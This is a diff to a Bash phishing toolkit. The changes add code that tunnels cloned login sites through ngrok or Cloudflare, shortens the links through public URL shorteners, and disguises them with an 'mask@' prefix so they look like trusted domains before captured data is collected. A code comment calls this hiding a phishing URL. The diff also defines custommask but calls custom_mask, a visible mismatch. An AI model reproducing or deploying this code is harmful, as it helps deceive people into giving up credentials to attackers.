@@ -140,6 +140,7 @@ kill_pid() {
 	fi
 }
 
+
 ## Banner
 banner() {
 	cat <<- EOF
@@ -211,6 +212,13 @@ dependencies() {
 		done
 	fi
 
+}
+
+## Check Internet Status
+check_status() {
+	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Internet Status : "
+	timeout 3s curl -fIs "https://api.github.com" > /dev/null
+	[ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" && check_update || echo -e "${RED}Offline${WHITE}"
 }
 
 ## Download Ngrok
@@ -352,6 +360,66 @@ customport() {
 	fi
 }
 
+## Custom Mask URL
+custommask() {
+	{ sleep .5; clear; banner_small; echo; }
+	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do You Want To Change Mask URL? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] :${ORANGE} " mask_op
+	echo
+	if [[ ${mask_op,,} == "y" ]]; then
+		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter your custom URL below ${CYAN}(${ORANGE}Example: https://example.com${CYAN})\n"
+		read -e -p "${WHITE} ==> ${ORANGE}" -i "https://" mask_url # initial text requires Bash 4+
+		if [[ ${mask_url//:*} =~ ^([h][t][t][p][s]?)$ || ${mask_url::3} == "www" ]] && [[ ${mask_url#http*//} =~ ^[^,~!@%:\=\#\;\^\*\"\'\|\?+\<\>\(\{\)\}\\/]+$ ]]; then
+			mask=$mask_url
+			echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} Using Custom Masked Url :${GREEN} $mask"
+		else
+			echo -e "\n${RED}[${WHITE}!${RED}]${ORANGE} Invalid Url Type..Using The Default One.."
+		fi
+	fi
+}
+
+## URL Shortner
+site_stat() { [[ ${1} != "" ]] && curl -s -o "/dev/null" -w "%{http_code}" "${1}https://github.com"; }
+
+shorten() {
+	short=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
+	if [[ "$1" == *"shrtco.de"* ]]; then
+		processed_url=$(echo ${short} | sed 's/\\//g' | grep -o '"short_link2":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
+	else
+		# processed_url=$(echo "$short" | awk -F// '{print $NF}')
+		processed_url=${short#http*//}
+	fi
+}
+
+custom_url() {
+	url=${1#http*//}
+	isgd="https://www.is.gd/create.php?format=simple&url="
+	shortcode="https://api.shrtco.de/v2/shorten?url="
+	tinyurl="https://tinyurl.com/api-create.php?url="
+
+	{ custom_mask; sleep 1; clear; banner_small; }
+	if [[ ${url} =~ [-a-zA-Z0-9.]*(ngrok.io|trycloudflare.com|loclx.io) ]]; then
+		if [[ $(site_stat $isgd) == 2* ]]; then
+			shorten $isgd "$url"
+		elif [[ $(site_stat $shortcode) == 2* ]]; then
+			shorten $shortcode "$url"
+		else
+			shorten $tinyurl "$url"
+		fi
+
+		url="https://$url"
+		masked_url="$mask@$processed_url"
+		processed_url="https://$processed_url"
+	else
+		# echo "[!] No url provided / Regex Not Matched"
+		url="Unable to generate links. Try after turning on hotspot"
+		processed_url="Unable to Short URL"
+	fi
+
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$url"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${ORANGE}$processed_url"
+	[[ $processed_url != *"Unable"* ]] && echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 3 : ${ORANGE}$masked_url"
+}
+
 setup_site() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
 	cp -rf .sites/"$website"/* .server/www
@@ -415,9 +483,10 @@ start_ngrok() {
 
 	{ sleep 8; clear; banner_small; }
 	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
-	ngrok_url1=${ngrok_url#https://}
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$ngrok_url"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$ngrok_url1"
+	custom_url "$ngrok_url"
+	# ngrok_url1=${ngrok_url#https://}
+	# echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$ngrok_url"
+	# echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$ngrok_url1"
 	capture_data
 }
 
@@ -441,6 +510,8 @@ start_cloudflared() {
 	{ sleep 8; clear; banner_small; }
 	
 	cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cld.log")
+	custom_url "$cldflr_link"
+	<< 'MULTILINE-COMMENT'
 	cldflr_link1=${cldflr_link#https://}
 	
 	# Bash Script for Hide Phishing URL Created by KP
@@ -453,6 +524,8 @@ start_cloudflared() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$cldflr_link"
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$cldflr_link1"
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 3 : ${GREEN}$mask@$final"
+	
+	MULTILINE-COMMENT
 	capture_data
 }
 
@@ -836,6 +909,7 @@ main_menu() {
 ## Main
 kill_pid
 dependencies
+check_status
 install_ngrok
 install_cloudflared
 main_menu
